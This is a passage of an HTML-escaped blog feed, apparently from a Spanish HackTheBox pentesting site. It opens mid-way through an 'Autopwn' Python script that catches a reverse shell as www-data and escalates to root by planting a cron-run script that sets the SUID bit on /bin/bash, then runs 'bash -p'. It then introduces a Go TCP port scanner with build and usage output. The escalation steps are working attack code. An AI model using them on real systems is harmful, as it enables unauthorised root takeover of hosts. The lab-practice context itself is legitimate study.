  &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Petición enviada con éxito&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Petición enviada con éxito&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Ha ocurrido un error...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;

 &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obtainShell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

 &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wait_for_connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;failure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No se ha obtenido ninguna conexión&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Se ha obtenido una conexión&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Acceso al sistema como usuario www-data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;n&quot;&gt;p3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Escalación de privilegios&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Creando fichero logcleared.sh en el sistema&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo -e '#!/bin/bash&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;chmod u+s /bin/bash' &amp;gt; /var/www/cmd/logcleared.sh; chmod +x /var/www/cmd/logcleared.sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Archivo logcleared.sh creado&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Obteniendo shell como root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Pwned!!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

 &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="HackTheBox" /><category term="Autopwn" /><category term="Scripting" /><category term="Sqli" /><category term="Web Exploiting" /><category term="Privilege Escalation" /><category term="Python" /><category term="Pentesting" /><summary type="html">Una máquina muy interesante la cual resolvemos en mi canal de YouTube. En este caso, os comparto el script `Autopwn` que nos habíamos configurado en Python, donde tras su ejecución se nos automatiza la intrusión y la escalada de privilegios mediante el uso de la librería pwn.</summary></entry><entry><title type="html">FastTcpScan - Go</title><link href="http://localhost:4000/fasttcpscan-go/" rel="alternate" type="text/html" title="FastTcpScan - Go" /><published>2020-01-31T00:00:00+01:00</published><updated>2020-01-31T00:00:00+01:00</updated><id>http://localhost:4000/fasttcpscan-go</id><content type="html" xml:base="http://localhost:4000/fasttcpscan-go/">&lt;p&gt;&lt;img src=&quot;/assets/images/fasttcpscan-go/golang-go.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En el siguiente artículo os comparto la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FastTcpScan&lt;/code&gt; que nos desarrollamos en la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hawk&lt;/code&gt; de la plataforma &lt;a href=&quot;https://hackthebox.eu&quot;&gt;HackTheBox&lt;/a&gt;. Esta herramienta consiste en un escáner que permite detectar de forma rápida y precisa los puertos TCP que una máquina tiene abiertos.&lt;/p&gt;

&lt;p&gt;Para aquellos que quieran ver el desarrollo de la herramienta paso a paso, tenéis disponible el siguiente vídeo en el que la creamos desde 0:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=7L1WNU7fBec&quot;&gt;Máquina Hawk - HackTheBox&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;La herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fastTCPScan.go&lt;/code&gt; la podéis encontrar más abajo en este mismo artículo.&lt;/p&gt;

&lt;h2 id=&quot;cómo-se-usa-la-herramienta&quot;&gt;¿Cómo se usa la herramienta?&lt;/h2&gt;

&lt;p&gt;Lo primero una vez contemos con el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fastTCPScan.go&lt;/code&gt;, será compilarlo. Esto podemos hacerlo de la siguiente forma:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;✗&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;build&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ldflags&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-s -w&quot;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastTCPScan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;go&lt;/span&gt; 
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upx&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastTCPScan&lt;/span&gt;
                       &lt;span class=&quot;n&quot;&gt;Ultimate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Packer&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eXecutables&lt;/span&gt;
                          &lt;span class=&quot;n&quot;&gt;Copyright&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1996&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2018&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;UPX&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;3.95&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;Markus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Oberhumer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Laszlo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Molnar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;John&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reiser&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Aug&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;th&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2018&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;Ratio&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;Format&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;
   &lt;span class=&quot;o&quot;&gt;--------------------&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;-----------&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;-----------&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;upx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FileNotFoundException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;No&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;such&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;directory&lt;/span&gt;
   &lt;span class=&quot;m&quot;&gt;2260992&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;    &lt;span class=&quot;m&quot;&gt;868864&lt;/span&gt;   &lt;span class=&quot;m&quot;&gt;38.43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amd64&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;fastTCPScan&lt;/span&gt;                   

&lt;span class=&quot;n&quot;&gt;Packed&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, ya podremos usar la herramienta. Su uso es de lo más sencillo, cabe decir antes que nada que la herramienta cuenta con un panel de ayuda:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;✗&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fastTCPScan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Usage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastTCPScan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dirección&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;escanear&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;range&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Rango&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;de&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puertos&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;comprobar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;65535&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1-65535&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Número&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;de&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hilos&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;duration&lt;/span&gt;
